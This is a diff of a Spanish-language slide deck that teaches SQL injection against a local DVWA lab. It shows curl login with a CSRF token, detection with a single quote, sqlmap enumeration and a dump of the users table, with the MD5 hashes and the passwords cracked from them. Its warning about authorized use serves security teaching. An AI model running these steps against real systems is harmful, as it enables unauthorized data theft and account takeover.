@@ -407,36 +407,30 @@
                 <h2>Demo SQLi — Paso 0: Setup</h2>
                 <p style="font-size:0.62em;color:var(--text-muted)">Levantar laboratorio DVWA con Docker. Solo entorno local.</p>
                 
-                <div class="terminal" style="font-size:0.58em">
-                    <div class="line"><span class="comment"># 1. Descargar imagen y levantar contenedor</span></div>
+                <div class="terminal" style="font-size:0.52em">
+                    <div class="line"><span class="comment"># 1. Levantar DVWA</span></div>
                     <div class="line"><span class="prompt">$</span> <span class="command">docker run -d -p 80:80 --name dvwa vulnerables/web-dvwa</span></div>
+                    <div class="line"><span class="comment"># Esperar ~30 segundos a que inicie MySQL</span></div>
                     <div class="line">&nbsp;</div>
-                    <div class="line"><span class="comment"># 2. Esperar ~30 segundos</span></div>
-                    <div class="line"><span class="comment"># Verificar que el contenedor está corriendo:</span></div>
-                    <div class="line"><span class="prompt">$</span> <span class="command">docker ps | grep dvwa</span></div>
-                    <div class="line"><span class="output" style="color:var(--green)">CONTAINER ID  STATUS  PORTS</span></div>
-                    <div class="line"><span class="output" style="color:var(--green)">abc123  Up 30s  0.0.0.0:80->80/tcp</span></div>
+                    <div class="line"><span class="comment"># 2. Login (obtener token CSRF)</span></div>
+                    <div class="line"><span class="prompt">$</span> <span class="command">TOKEN=$(curl -s http://localhost/login.php | grep -oP "user_token.*value='\K[^']+")</span></div>
+                    <div class="line"><span class="prompt">$</span> <span class="command">curl -c cookies.txt -d "username=admin&password=password&Login=Login&user_token=$TOKEN" http://localhost/login.php</span></div>
+                    <div class="line">&nbsp;</div>
+                    <div class="line"><span class="comment"># 3. Verificar login</span></div>
+                    <div class="line"><span class="prompt">$</span> <span class="command">curl -b cookies.txt http://localhost/ | grep "Security Level"</span></div>
+                    <div class="line"><span class="output" style="color:var(--green)">Security Level: low</span></div>
                 </div>
 
-                <div class="info-box cyan" style="margin-top:0.3em">
-                    <h4>🌐 Configuración vía Navegador (solo 1ª vez)</h4>
-                    <p style="font-size:0.58em"><strong>Paso 1:</strong> Abrir <a href="http://localhost/setup.php" target="_blank">http://localhost/setup.php</a></p>
-                    <p style="font-size:0.58em"><strong>Paso 2:</strong> Click <strong>"Create / Reset Database"</strong></p>
-                    <p style="font-size:0.58em"><strong>Paso 3:</strong> Login: <code>admin</code> / <code>password</code></p>
-                    <p style="font-size:0.58em"><strong>Paso 4:</strong> Ir a <a href="http://localhost/security.php" target="_blank">http://localhost/security.php</a> → Seleccionar <strong>"Low"</strong> → Submit</p>
-                </div>
-
-                <div class="info-box green" style="margin-top:0.3em">
-                    <h4>✅ Verificar Setup</h4>
-                    <p style="font-size:0.6em">Acceder a <a href="http://localhost" target="_blank">http://localhost</a> → Login: admin/password → Verificar nivel "low"</p>
+                <div class="info-box" style="margin-top:0.2em">
+                    <h4>⚠️ Nota Importante</h4>
+                    <p style="font-size:0.58em">La primera vez, DVWA crea la BD automáticamente. Si falla, abrir <code>http://localhost/setup.php</code> en navegador y click "Create/Reset Database".</p>
                 </div>
 
                 <div class="info-box orange" style="margin-top:0.2em">
-                    <h4>🔧 Troubleshooting Común</h4>
+                    <h4>🔧 Troubleshooting</h4>
                     <p style="font-size:0.52em"><strong>1.</strong> "Unable to find image" → Normal, esperar descarga (~1-2 min)</p>
-                    <p style="font-size:0.52em"><strong>2.</strong> "Port 80 already in use" → <code>docker rm dvwa</code> y repetir</p>
-                    <p style="font-size:0.52em"><strong>3.</strong> "Connection refused" → Esperar 30s, DVWA necesita iniciar MySQL</p>
-                    <p style="font-size:0.52em"><strong>4.</strong> Verificar estado: <code>docker ps | grep dvwa</code></p>
+                    <p style="font-size:0.52em"><strong>2.</strong> "Port 80 in use" → <code>docker rm -f dvwa</code> y repetir</p>
+                    <p style="font-size:0.52em"><strong>3.</strong> "Connection refused" → Esperar 30s, MySQL inicia después</p>
                 </div>
             </section>
 
@@ -445,43 +439,28 @@
                 <h2>Demo SQLi — Paso 1: Detección</h2>
                 <p style="font-size:0.62em;color:var(--text-muted)">Identificar la vulnerabilidad con comillas simples.</p>
                 
-                <div class="columns">
-                    <div>
-                        <div class="terminal" style="font-size:0.52em">
-                            <div class="line"><span class="comment"># Request normal — funciona</span></div>
-                            <div class="line"><span class="prompt">$</span> <span class="command">curl "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit"</span></div>
-                            <div class="line"><span class="output">ID: 1</span></div>
-                            <div class="line"><span class="output">First name: admin</span></div>
-                            <div class="line"><span class="output">Surname: admin</span></div>
-                            <div class="line">&nbsp;</div>
-                            <div class="line"><span class="comment"># Request malicioso — ERROR = SQLi</span></div>
-                            <div class="line"><span class="prompt">$</span> <span class="command">curl "http://localhost/vulnerabilities/sqli/?id=1'&Submit=Submit"</span></div>
-                            <div class="line"><span class="output" style="color:var(--pink)">You have an error in your SQL syntax</span></div>
-                            <div class="line"><span class="output" style="color:var(--pink)">near "'' at line 1</span></div>
-                        </div>
-                    </div>
-                    <div>
-                        <div class="info-box pink" style="margin-bottom:0.3em">
-                            <h4>🔍 Análisis</h4>
-                            <p style="font-size:0.58em">El servidor interpreta:</p>
-                            <p style="font-size:0.55em;font-family:var(--mono)">SELECT * FROM users WHERE id='1''</p>
-                            <p style="font-size:0.58em;margin-top:0.2em">La comilla extra rompe la query SQL</p>
-                        </div>
-                        <div class="info-box cyan">
-                            <h4>💡 Técnicas de Detección</h4>
-                            <ul style="font-size:0.58em">
-                                <li><code>id=1'</code> — Comilla simple</li>
-                                <li><code>id=1"</code> — Comilla doble</li>
-                                <li><code>id=1 OR 1=1</code> — Lógica</li>
-                                <li><code>id=1'--</code> — Comment</li>
-                            </ul>
-                        </div>
-                    </div>
+                <div class="terminal" style="font-size:0.52em">
+                    <div class="line"><span class="comment"># Request normal (con cookies de sesión)</span></div>
+                    <div class="line"><span class="prompt">$</span> <span class="command">curl -b cookies.txt "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" | grep -E "ID:|First name"</span></div>
+                    <div class="line"><span class="output">ID: 1</span></div>
+                    <div class="line"><span class="output">First name: admin</span></div>
+                    <div class="line"><span class="output">Surname: admin</span></div>
+                    <div class="line">&nbsp;</div>
+                    <div class="line"><span class="comment"># Request con comilla simple — ERROR = SQLi</span></div>
+                    <div class="line"><span class="prompt">$</span> <span class="command">curl -b cookies.txt "http://localhost/vulnerabilities/sqli/?id=1'&Submit=Submit"</span></div>
+                    <div class="line"><span class="output" style="color:var(--pink)">You have an error in your SQL syntax</span></div>
+                    <div class="line"><span class="output" style="color:var(--pink)">near ''1''' at line 1</span></div>
                 </div>
 
-                <div class="info-box green" style="margin-top:0.3em">
+                <div class="info-box pink" style="margin-top:0.3em">
+                    <h4>🔍 Análisis — El servidor interpreta:</h4>
+                    <p style="font-size:0.55em;font-family:var(--mono);color:var(--pink)">SELECT * FROM users WHERE id='1''</p>
+                    <p style="font-size:0.55em;margin-top:0.1em">La comilla extra rompe la query → ERROR</p>
+                </div>
+
+                <div class="info-box green" style="margin-top:0.2em">
                     <h4>✓ SQLi CONFIRMADO</h4>
-                    <p style="font-size:0.6em">El error "SQL syntax" confirma que el input del usuario se inyecta directamente en la query SQL sin sanitización.</p>
+                    <p style="font-size:0.58em">Error "SQL syntax" = input se inyecta directamente en query SQL sin sanitización.</p>
                 </div>
             </section>
 
@@ -490,31 +469,30 @@
                 <h2>Demo SQLi — Paso 2: Enumeración</h2>
                 <p style="font-size:0.62em;color:var(--text-muted)">Usar sqlmap para mapear la base de datos.</p>
                 
-                <div class="terminal" style="font-size:0.52em">
-                    <div class="line"><span class="comment"># 1. Guardar request en archivo</span></div>
-                    <div class="line"><span class="prompt">$</span> <span class="command">curl "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" -o req.txt</span></div>
+                <div class="terminal" style="font-size:0.48em">
+                    <div class="line"><span class="comment"># 1. Extraer token de sesión para sqlmap</span></div>
+                    <div class="line"><span class="prompt">$</span> <span class="command">SESSID=$(grep PHPSESSID cookies.txt | awk '{print $NF}')</span></div>
+                    <div class="line"><span class="prompt">$</span> <span class="command">sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \</span></div>
+                    <div class="line"><span class="command">&nbsp;&nbsp;--cookie="PHPSESSID=$SESSID; security=low" \</span></div>
+                    <div class="line"><span class="command">&nbsp;&nbsp;--batch --dbs</span></div>
                     <div class="line">&nbsp;</div>
-                    <div class="line"><span class="comment"># 2. Detectar si es vulnerable (sin explotar)</span></div>
-                    <div class="line"><span class="prompt">$</span> <span class="command">sqlmap -r req.txt --batch</span></div>
-                    <div class="line"><span class="output" style="color:var(--cyan)">[INFO] testing parameter(s)</span></div>
-                    <div class="line"><span class="output" style="color:var(--green)">[CRITICAL] parameter 'id' is injectable</span></div>
-                    <div class="line">&nbsp;</div>
-                    <div class="line"><span class="comment"># 3. Enumerar bases de datos disponibles</span></div>
-                    <div class="line"><span class="prompt">$</span> <span class="command">sqlmap -r req.txt --batch --dbs</span></div>
-                    <div class="line"><span class="output">[INFO] available databases [2]:</span></div>
+                    <div class="line"><span class="output" style="color:var(--green)">available databases [2]:</span></div>
                     <div class="line"><span class="output">[*] dvwa</span></div>
                     <div class="line"><span class="output">[*] information_schema</span></div>
                     <div class="line">&nbsp;</div>
-                    <div class="line"><span class="comment"># 4. Enumerar tablas de dvwa</span></div>
-                    <div class="line"><span class="prompt">$</span> <span class="command">sqlmap -r req.txt --batch -D dvwa --tables</span></div>
-                    <div class="line"><span class="output">[INFO] tables [2]:</span></div>
-                    <div class="line"><span class="output">[*] guestbook</span></div>
-                    <div class="line"><span class="output">[*] users</span></div>
+                    <div class="line"><span class="comment"># 2. Enumerar tablas</span></div>
+                    <div class="line"><span class="prompt">$</span> <span class="command">sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \</span></div>
+                    <div class="line"><span class="command">&nbsp;&nbsp;--cookie="PHPSESSID=$SESSID; security=low" \</span></div>
+                    <div class="line"><span class="command">&nbsp;&nbsp;--batch -D dvwa --tables</span></div>
+                    <div class="line">&nbsp;</div>
+                    <div class="line"><span class="output">[2 tables]</span></div>
+                    <div class="line"><span class="output">| guestbook |</span></div>
+                    <div class="line"><span class="output">| users     |</span></div>
                 </div>
 
                 <div class="info-box" style="margin-top:0.3em">
                     <h4>⚠️ Aviso Legal</h4>
-                    <p style="font-size:0.6em">Este comando --dbs NO modifica datos. Solo enumera. Usar --dbs solo en sistemas con autorización.</p>
+                    <p style="font-size:0.58em">--dbs y --tables solo enumeran, NO modifican datos. Usar solo en sistemas con autorización explícita.</p>
                 </div>
             </section>
 
@@ -523,33 +501,30 @@
                 <h2>Demo SQLi — Paso 3: Extracción</h2>
                 <p style="font-size:0.62em;color:var(--text-muted)">Extraer datos sensibles (laboratorio local).</p>
                 
-                <div class="terminal" style="font-size:0.52em">
-                    <div class="line"><span class="comment"># 1. Ver columnas de la tabla users</span></div>
-                    <div class="line"><span class="prompt">$</span> <span class="command">sqlmap -r req.txt --batch -D dvwa -T users --columns</span></div>
-                    <div class="line"><span class="output">[INFO] columns [5]:</span></div>
-                    <div class="line"><span class="output">[*] user_id</span></div>
-                    <div class="line"><span class="output">[*] first_name</span></div>
-                    <div class="line"><span class="output">[*] last_name</span></div>
-                    <div class="line"><span class="output">[*] user</span></div>
-                    <div class="line"><span class="output">[*] password</span></div>
+                <div class="terminal" style="font-size:0.48em">
+                    <div class="line"><span class="comment"># Extraer TODOS los usuarios (LAB LOCAL)</span></div>
+                    <div class="line"><span class="prompt">$</span> <span class="command">sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \</span></div>
+                    <div class="line"><span class="command">&nbsp;&nbsp;--cookie="PHPSESSID=$SESSID; security=low" \</span></div>
+                    <div class="line"><span class="command">&nbsp;&nbsp;--batch --dump -D dvwa -T users</span></div>
                     <div class="line">&nbsp;</div>
-                    <div class="line"><span class="comment"># 2. Extraer TODOS los usuarios (LAB LOCAL)</span></div>
-                    <div class="line"><span class="prompt">$</span> <span class="command">sqlmap -r req.txt --batch -D dvwa -T users --dump</span></div>
-                    <div class="line">&nbsp;</div>
-                    <div class="line"><span class="output" style="color:var(--doom-gold)">+----------+------------+-----------+----------+--------------------------------+</span></div>
-                    <div class="line"><span class="output" style="color:var(--doom-gold)">| user_id  | first_name | last_name | user     | password                      |</span></div>
-                    <div class="line"><span class="output" style="color:var(--doom-gold)">+----------+------------+-----------+----------+--------------------------------+</span></div>
-                    <div class="line"><span class="output" style="color:var(--doom-gold)">| 1        | admin      | admin     | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |</span></div>
-                    <div class="line"><span class="output" style="color:var(--doom-gold)">| 2        | Gordon     | Brown     | gordonb  | e99a18c428cb38d5f260853678922e03 |</span></div>
-                    <div class="line"><span class="output" style="color:var(--doom-gold)">| 3        | Pablo      | Picasso   | pablo    | 0d107d09f5bbe40cade3de5c71e9e9b7 |</span></div>
-                    <div class="line"><span class="output" style="color:var(--doom-gold)">| 4        | Bob       | Smith      | smithy   | 5f4dcc3b5aa765d61d8327deb882cf99 |</span></div>
-                    <div class="line"><span class="output" style="color:var(--doom-gold)">+----------+------------+-----------+----------+--------------------------------+</span></div>
+                    <div class="line"><span class="output" style="color:var(--doom-gold)">+----------+----------+------------+--------------------------------+</span></div>
+                    <div class="line"><span class="output" style="color:var(--doom-gold)">| user_id  | user     | first_name | password                       |</span></div>
+                    <div class="line"><span class="output" style="color:var(--doom-gold)">+----------+----------+------------+--------------------------------+</span></div>
+                    <div class="line"><span class="output" style="color:var(--doom-gold)">| 1        | admin    | admin      | 5f4dcc3b5aa765d61d8327deb882cf99 |</span></div>
+                    <div class="line"><span class="output" style="color:var(--doom-gold)">| 2        | gordonb  | Gordon     | e99a18c428cb38d5f260853678922e03 |</span></div>
+                    <div class="line"><span class="output" style="color:var(--doom-gold)">| 3        | 1337     | Hack       | 8d3533d75ae2c3966d7e0d4fcc69216b |</span></div>
+                    <div class="line"><span class="output" style="color:var(--doom-gold)">| 4        | pablo    | Pablo      | 0d107d09f5bbe40cade3de5c71e9e9b7 |</span></div>
+                    <div class="line"><span class="output" style="color:var(--doom-gold)">| 5        | smithy   | Bob        | 5f4dcc3b5aa765d61d8327deb882cf99 |</span></div>
+                    <div class="line"><span class="output" style="color:var(--doom-gold)">+----------+----------+------------+--------------------------------+</span></div>
                 </div>
 
                 <div class="info-box pink" style="margin-top:0.3em">
-                    <h4>🔴 Hashes MD5 — Fácil de Cracking</h4>
-                    <p style="font-size:0.58em"><code>5f4dcc3b5aa765d61d8327deb882cf99</code> = <strong>password</strong></p>
-                    <p style="font-size:0.55em">Usar <a href="https://crackstation.net" target="_blank">crackstation.net</a> o <code>hashcat</code> para crackear hashes.</p>
+                    <h4>🔴 Hashes Crackeados</h4>
+                    <p style="font-size:0.52em"><code>admin</code> → <code>password</code></p>
+                    <p style="font-size:0.52em"><code>gordonb</code> → <code>123456</code></p>
+                    <p style="font-size:0.52em"><code>1337</code> → <code>charlie</code></p>
+                    <p style="font-size:0.52em"><code>pablo</code> → <code>letmein</code></p>
+                    <p style="font-size:0.52em"><code>smithy</code> → <code>password</code></p>
                 </div>
             </section>
 
